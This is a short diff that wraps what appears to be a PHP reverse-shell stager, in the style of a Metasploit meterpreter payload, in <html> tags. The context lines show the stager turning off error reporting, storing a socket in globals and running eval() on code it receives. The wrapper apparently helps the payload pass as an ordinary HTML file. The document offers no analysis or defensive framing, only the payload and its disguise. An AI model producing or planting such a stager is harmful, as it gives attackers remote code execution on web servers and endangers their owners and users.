@@ -1,3 +1,5 @@
+<html>
+
 /*<?php
 /**/
 error_reporting(0);
@@ -50,3 +52,5 @@ $GLOBALS['msgsock']      = $s;
 $GLOBALS['msgsock_type'] = $s_type;
 eval($b);
 die();
+
+</html>
